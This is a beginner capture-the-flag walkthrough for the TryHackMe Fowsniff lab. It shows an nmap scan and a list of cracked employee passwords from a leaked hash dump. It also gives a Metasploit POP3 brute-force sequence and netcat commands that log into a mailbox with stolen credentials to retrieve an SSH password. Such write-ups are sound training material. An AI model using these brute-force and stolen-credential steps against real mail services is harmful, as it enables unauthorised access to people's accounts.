# [Fowsniff CTF](https://tryhackme.com/room/ctf)

## Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

# Hack into the FowSniff organisation

### Using nmap, scan this machine. What ports are open?

### Using the information from the open ports. Look around. What can you find?

_nmap -A -p- -sV MACHINE_IP_

1. There are tcp ports open for:
   - ssh
   - http
   - pop3
   - imap

[SCREEN01]

---

### Using Google, can you find any public information about them?

_There is a pastebin with all of the company employees emails and hashes. If the pastebin is down, check out TheWayBackMachine, or https://github.com/berzerk0/Fowsniff_

1. All the pastebin I have found on [twitter](https://x.com/fowsniffcorp) are inactive. We are left with [github](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt)

### Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them

1. Decoded passwords are:
   - mauer@fowsniff:mailcall
   - mustikka@fowsniff:bilbo101
   - tegel@fowsniff:apples01
   - baksteen@fowsniff:skyler22
   - seina@fowsniff:scoobydoo2
   - stone@fowsniff:!!LILY!..\*7¡VA
   - mursten@fowsniff:carp4ever
   - parede@fowsniff:orlando12
   - sciana@fowsniff:07011972

### Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?

_In metasploit there is a packages called: auxiliary/scanner/pop3/pop3_login where you can enter all the usernames and passwords you found to brute force this machines pop3 service._

1. Put the usernames and passwords into separate files and use metasploit

```bash
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS IP
set USER_FILE /root/usernames.txt
set PASS_FILE /root/passwords.txt
run
```

### What was seina's password to the email service?

1. We have cracked it earlier. The password is `scoobydoo2`

### Can you connect to the pop3 service with her credentials? What email information can you gather?

### Looking through her emails, what was a temporary password set for her?

_Use netcat with the port 110 to view her emails. nc <ip> 110_

1. The temporary password is `S1ck3nBluff+secureshell`

```bash
nc 10.10.165.24 110
USER seina
PASS scoobydoo2
LIST
RETR 1
```

[SCREEN02]
